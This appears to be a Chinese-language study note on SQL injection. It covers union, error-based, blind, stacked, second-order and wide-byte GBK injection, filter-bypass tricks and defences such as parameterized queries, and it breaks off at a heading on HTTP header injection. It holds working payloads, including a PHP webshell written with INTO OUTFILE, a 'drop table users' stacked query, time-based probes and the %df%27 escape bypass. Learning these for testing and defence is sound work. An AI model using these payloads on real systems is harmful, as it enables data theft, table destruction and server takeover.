综述：SQL 注入是由于应用程序将用户输入直接拼接进 SQL 语句导致的漏洞。攻击者通过构造恶意 SQL 语句改变原有查询逻辑，从而获取数据库敏感信息。SQL 注入主要分为联合查询注入、报错注入、布尔盲注、时间盲注和堆叠注入。防御方法主要是使用预编译参数化查询、输入校验以及最小权限原则。
# 注入类型

### 👉 利用思路

1. 判断是否存在注入（单引号 `'`）
2. 判断类型（报错/盲注）
3. 获取数据库信息（库→表→字段）
4. 拿数据 or 写shell

### 👉 写shell条件（重点！）

- 有写权限
- 知道网站路径
- 数据库用户高权限（root
```sql
select '<?php eval($_POST[1]);?>' into outfile '/var/www/html/shell.php'
```

## 经典注入（Union 注入）
SELECT name,price FROM product WHERE id=1  
UNION  
SELECT username,password FROM users

?id=1'
?id=1 and 1=1
?id=1 and 1=2
## 报错注入（Error Based）
利用数据库报错返回数据。
updatexml()  
extractvalue()  
floor()  
exp()
?id=1 and updatexml(1,concat(0x7e,(select database()),0x7e),1)
## 布尔盲注（Boolean Blind）
?id=1 and length(database())>5
ascii(substr(database(),1,1))=115
## 时间盲注（Time Based）
sleep()
benchmark()
?id=1 and if(substr(database(),1,1)='s',sleep(5),1)
## 堆叠注入（Stacked Query）
1; drop table users;
- MSSQL
- PostgreSQL

# SQL 注入常见绕过
大小写绕过 UnIoN SeLeCt
编码绕过 %55nion
注释绕过union/**/select
双写绕过ununionion
内联注释/*!50000union select*/

## SQL 注入防御
永远不要拼接 SQL
### 预编译（最有效）
cursor.execute("SELECT * FROM users WHERE id=%s",(id,))
### ORM
- Django ORM
- SQLAlchemy
### 输入校验 
id 只能是数字
### 最小权限
数据库账号不要 root。
###
WAF

# 真实环境
## 二次触发注入
二次注入是指攻击者提交的恶意数据被存入数据库，在后续程序从数据库读取该数据并拼接 SQL 时才触发注入。特点是注入点和输入点不一致，漏洞触发具有延迟性。

恶意 payload 第一次被存入数据库，第二次被程序取出并拼接 SQL 执行
>第一次：数据被存入数据库（不触发）
>第二次：读取数据 → 拼接SQL → 执行注入

比如注册环节
```
INSERT INTO users(username,password) VALUES('$username','$password');
```
username：admin'--
password：123456

CMS系统：
用户昵称
邮箱
评论内容
文章标题

所有数据库数据都必须视为不可信
## 宽字节注入
宽字节注入主要出现在 MySQL 的 GBK 编码环境中，攻击者利用多字节字符编码特性，使转义字符 `\` 被组合成一个宽字节字符，从而绕过 `addslashes` 的转义保护，最终实现 SQL 注入

**MySQL + GBK编码** 环境的经典漏洞 字符编码解析差异
注入流程
>payload：%df' OR 1=1#  
>URL编码：%df%27 OR 1=1#
>过滤后：%df%5c%27 OR 1=1#
>数据库解析：%df%5c → 一个GBK字符
>最后：>' OR 1=1#

成功逃逸。

注入条件

|条件|说明|
|---|---|
|MySQL|数据库|
|GBK编码|非UTF8|
|addslashes|使用转义|
|未使用预编译||

HTTP Header SQL注入




